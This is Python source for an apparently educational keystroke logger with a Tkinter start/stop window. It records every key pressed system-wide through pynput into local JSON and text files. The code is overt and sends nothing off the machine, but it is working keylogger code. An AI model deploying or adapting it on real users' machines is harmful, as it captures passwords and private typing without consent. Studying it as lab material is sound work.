import json
from pynput import keyboard
import tkinter as tk
from tkinter import messagebox

listener = None
is_logging = False

JSON_FILE = "logs.json"
TEXT_FILE = "logs.txt"

# Load or initialize JSON file
def load_json():
    try:
        with open(JSON_FILE, "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return {"keystrokes": []}

def save_json(data):
    with open(JSON_FILE, "w") as f:
        json.dump(data, f, indent=4)

# Key press handler
def on_press(key):
    if not is_logging:
        return

    data = load_json()

    try:
        key_value = key.char
    except AttributeError:
        key_value = str(key)

    # Save to JSON
    data["keystrokes"].append(key_value)
    save_json(data)

    # Save to TXT
    with open(TEXT_FILE, "a") as f:
        f.write(key_value + "\n")

# Start logging
def start_logging():
    global listener, is_logging
    if not is_logging:
        is_logging = True
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        status_label.config(text="Status: Logging Started", fg="green")
        messagebox.showinfo("Keylogger", "Keylogging Started (Educational Mode)")

# Stop logging
def stop_logging():
    global listener, is_logging
    if is_logging:
        is_logging = False
        if listener:
            listener.stop()
        status_label.config(text="Status: Logging Stopped", fg="red")
        messagebox.showinfo("Keylogger", "Keylogging Stopped")

# GUI Setup
root = tk.Tk()
root.title("Educational Keystroke Logger")
root.geometry("400x250")
root.resizable(False, False)

title = tk.Label(root, text="Keystroke Logger (Cyber Security Lab)", 
                 font=("Arial", 12, "bold"))
title.pack(pady=10)

start_btn = tk.Button(root, text="Start Logging", width=25,
                      bg="green", fg="white", command=start_logging)
start_btn.pack(pady=5)

stop_btn = tk.Button(root, text="Stop Logging", width=25,
                     bg="red", fg="white", command=stop_logging)
stop_btn.pack(pady=5)

status_label = tk.Label(root, text="Status: Stopped", fg="red")
status_label.pack(pady=15)

footer = tk.Label(root, text="For Educational & Cybersecurity Training Only",
                  font=("Arial", 9))
footer.pack(side="bottom", pady=10)

root.mainloop()
